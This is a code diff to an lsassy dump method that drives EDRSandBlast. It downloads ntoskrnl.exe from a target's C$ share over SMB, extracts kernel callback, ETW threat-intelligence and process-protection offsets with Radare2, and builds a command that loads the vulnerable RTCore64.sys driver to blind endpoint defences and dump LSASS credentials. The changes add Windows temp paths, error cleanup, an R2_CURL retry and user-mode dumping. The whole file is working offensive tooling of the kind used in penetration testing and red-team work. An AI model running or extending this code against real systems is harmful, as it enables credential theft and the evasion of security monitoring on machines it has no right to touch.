@@ -12,8 +12,8 @@ from lsassy.dumpmethod import IDumpMethod, Dependency
 
 
 class DumpMethod(IDumpMethod):
-    def __init__(self, session, timeout):
-        super().__init__(session, timeout)
+    def __init__(self, session, timeout, time_between_commands):
+        super().__init__(session, timeout, time_between_commands)
         self.edrsandblast = Dependency("edrsandblast", "EDRSandBlast.exe")
         self.RTCore64 = Dependency("RTCore64", "RTCore64.sys")
         self.ntoskrnl = Dependency("ntoskrnl", "NtoskrnlOffsets.csv")
@@ -21,19 +21,27 @@ class DumpMethod(IDumpMethod):
         self.tmp_ntoskrnl = "lsassy_" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32)) + ".exe"
 
     def prepare(self, options):
-        with open('/tmp/{}'.format(self.tmp_ntoskrnl), 'wb') as p:
+        if os.name == 'nt':
+            tmp_dir = 'C:\\Windows\\Temp\\'
+        else:
+            tmp_dir = '/tmp/'
+        with open('{}{}'.format(tmp_dir, self.tmp_ntoskrnl), 'wb') as p:
             try:
                 self._session.smb_session.getFile("C$", "\\Windows\\System32\\ntoskrnl.exe", p.write)
-                logging.success("ntoskrnl.exe downloaded to /tmp/{}".format(self.tmp_ntoskrnl))
+                logging.success("ntoskrnl.exe downloaded to {}{}".format(tmp_dir, self.tmp_ntoskrnl))
             except Exception as e:
                 logging.error("ntoskrnl.exe download error", exc_info=True)
+                try:
+                    os.remove('{}{}'.format(tmp_dir, self.tmp_ntoskrnl))
+                except Exception as e:
+                    return None
                 return None
-        self.ntoskrnl.content = self.get_offsets("/tmp/{}".format(self.tmp_ntoskrnl))
+        self.ntoskrnl.content = self.get_offsets("{}{}".format(tmp_dir, self.tmp_ntoskrnl))
 
         if self.ntoskrnl.content is not None:
             logging.success("ntoskrnl offsets extracted")
             logging.debug(self.ntoskrnl.content.split("\n")[1])
-        os.remove('/tmp/{}'.format(self.tmp_ntoskrnl))
+        os.remove('{}{}'.format(tmp_dir, self.tmp_ntoskrnl))
 
         return self.prepare_dependencies(options, [self.edrsandblast, self.RTCore64, self.ntoskrnl])
 
@@ -41,7 +49,7 @@ class DumpMethod(IDumpMethod):
         self.clean_dependencies([self.edrsandblast, self.RTCore64, self.ntoskrnl])
 
     def get_commands(self, dump_path=None, dump_name=None, no_powershell=False):
-        cmd_command = """{} dump --kernelmode --driver {} --nt-offsets {} -o {}{}""".format(
+        cmd_command = """{} dump --usermode --kernelmode --driver {} --nt-offsets {} -o {}{}""".format(
             self.edrsandblast.get_remote_path(),
             self.RTCore64.get_remote_path(),
             self.ntoskrnl.get_remote_path(),
@@ -536,6 +544,11 @@ class DumpMethod(IDumpMethod):
             for symbol_name, get_offset in symbols:
                 symbol_value = get_offset(all_symbols_info, symbol_name)
                 symbols_values.append(symbol_value)
+            if "R2_CURL" not in os.environ and all(val == 0 for val in symbols_values):
+                logging.warning("Radare2 may have trouble to download PDB files. R2_CURL=1 environement variable has been set. Trying again.")
+                os.environ["R2_CURL"] = "1"
+                self.extractOffsets(input_file)
+
             return f'{imageVersion},{",".join(hex(val).replace("0x", "") for val in symbols_values)}\n'
         except Exception as e:
             return None
@@ -559,9 +572,7 @@ class DumpMethod(IDumpMethod):
         except (subprocess.CalledProcessError, FileNotFoundError):
             logging.error("Radare2 needs 'cabextract' package to be installed to work with PDB")
             return None
-        if "R2_CURL" not in os.environ:
-            logging.warning("Radare2 may have trouble to download PDB files. If offsets are reported as 0, export R2_CURL=1 prior to running the module.")
-
+        
         output_content = 'ntoskrnlVersion,PspCreateProcessNotifyRoutineOffset,PspCreateThreadNotifyRoutineOffset,PspLoadImageNotifyRoutineOffset,_PS_PROTECTIONOffset,EtwThreatIntProvRegHandleOffset,EtwRegEntry_GuidEntryOffset,EtwGuidEntry_ProviderEnableInfoOffset\n'
 
         ret = self.extractOffsets(ntoskrnl_path)
